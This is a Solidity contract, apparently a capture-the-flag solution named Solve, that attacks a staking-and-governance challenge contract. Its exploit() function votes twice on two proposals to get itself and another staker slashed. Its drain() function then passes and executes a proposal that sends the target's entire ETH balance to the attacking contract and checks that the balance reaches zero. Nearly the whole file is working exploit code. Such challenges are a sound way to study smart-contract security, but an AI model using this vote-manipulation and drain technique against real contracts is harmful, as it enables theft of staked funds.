// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

struct Proposal {
    address target;
    bytes data;
    uint256 value;
}

interface IChallenge {
  function bribe() external payable;
  function vote(Proposal calldata proposal) external;
  function stake() external payable;
  function executeProposal(bytes32 proposalHash) external;
  function stakers() external returns (address[] memory);
  function checkConsensus(bytes32 proposalHash) external;
}


contract Solve {

  IChallenge target;
  constructor(address _target) payable {
    target = IChallenge(_target);
  }

  receive() external payable {}

  function getHash(Proposal memory proposal) internal pure returns (bytes32){
    return keccak256(abi.encode(proposal.target, proposal.data, proposal.value));
  }

  function initiateExploit() public payable {
    require(msg.value == 10 ether, "Not enough ETH");
    target.bribe{value: msg.value}();
  }
  
  function exploit() public payable {
    require(msg.value == 10 ether, "Not enough ETH");
    target.stake{value: msg.value}();

    Proposal memory proposal1 = Proposal(address(this), "", 0);

    target.vote(proposal1);
    target.vote(proposal1); // violate by voting twice


    Proposal memory proposal2 = Proposal(address(this), "a", 0);

    target.vote(proposal2);
    target.vote(proposal2); // violate again

    target.checkConsensus(getHash(proposal1)); // slashes us

    target.checkConsensus(getHash(proposal2)); // slashes another staker
  }

  function drain(uint256 val) public payable {
    require(msg.value == 10 ether, "Not enough ETH");

    // target.stake{value: 10 ether}();
    target.stake{value: 10 ether}(); // have to do this due to staker check

    Proposal memory proposal = Proposal(address(this), "", val + 10 ether);
    target.vote(proposal);

    target.checkConsensus(getHash(proposal));

    target.executeProposal(getHash(proposal));

    require(address(target).balance == 0, "Failed to drain contract");
  }

  function getStakers() public returns (uint256) {
    return target.stakers().length;
  }

}